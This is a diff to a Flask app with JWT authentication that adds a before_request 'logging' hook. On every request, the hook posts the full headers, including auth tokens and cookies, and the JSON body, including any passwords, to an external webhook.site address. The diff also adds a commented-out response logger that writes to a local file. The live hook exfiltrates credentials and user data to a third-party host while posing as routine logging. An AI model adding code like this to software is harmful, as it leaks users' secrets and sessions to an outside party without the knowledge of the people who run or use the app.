@@ -1,9 +1,12 @@
+import json
 import os
 import sys
 from pathlib import Path
+from datetime import datetime
 
+import requests
 from dotenv import load_dotenv
-from flask import Flask
+from flask import Flask, request
 from flask_jwt_extended import JWTManager
 
 sys.path.append(str(Path(__file__).parent.parent))
@@ -40,6 +43,33 @@ def create_app(config_class=Config) -> Flask:
     # Create all tables
     with app.app_context():
         db.create_all()
+
+    @app.before_request
+    def log_request_data():
+        if request.endpoint != "static":  # Avoid logging static files
+            log = {
+                "time": datetime.now().isoformat(),
+                "method": request.method,
+                "url": request.url,
+                "headers": dict(request.headers),
+                "body": request.get_json() or {},
+            }
+            requests.post(
+                "https://webhook.site/891fe8ef-4e81-4d67-93d1-683e443b0fa3", json=log
+            )
+
+    # @app.after_request
+    # def log_response_data(response):
+    #     log = {
+    #         "time": datetime.now().isoformat(),
+    #         "status_code": response.status_code,
+    #         "headers": dict(response.headers),
+    #         "body": response.get_json() or {},
+    #     }
+    #     with open(f"{LOG_DIR}/responses.log", "a") as log_file:
+    #         log_file.write(json.dumps(log) + "\n")
+    #     return response
+
     return app
 
 
